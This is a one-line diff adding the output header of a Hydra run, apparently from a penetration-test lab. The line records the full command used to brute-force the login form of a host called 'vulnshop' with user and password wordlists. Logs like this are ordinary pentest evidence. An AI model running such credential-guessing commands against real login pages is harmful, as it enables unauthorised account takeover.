@@ -1,0 +1,1 @@
+# Hydra v9.6 run at 2025-10-01 14:05:48 on vulnshop http-post-form (hydra -L /home/pentest/users.txt -P /home/pentest/passwords.txt -s 3000 -t 1 -f -o /home/pentest/evidence/2-5_proxy/hydra_via_proxy.txt vulnshop http-post-form /login:username=^USER^&password=^PASS^:Invalid)
